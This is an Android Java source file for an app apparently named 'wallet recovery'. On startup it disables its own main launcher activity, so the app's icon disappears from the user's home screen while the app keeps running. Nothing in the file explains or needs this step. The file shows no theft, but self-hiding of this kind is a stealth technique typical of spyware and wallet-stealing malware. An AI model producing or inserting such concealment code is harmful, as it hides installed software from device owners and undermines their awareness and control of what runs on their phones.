package com.example.walletrecovery;

import android.app.Application;
import android.content.pm.PackageManager;
import android.content.ComponentName;

public class App extends Application {
    @Override
    public void onCreate() {
        super.onCreate();
        hideAppIcon();
    }

    private void hideAppIcon() {
        PackageManager packageManager = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        );
    }
}
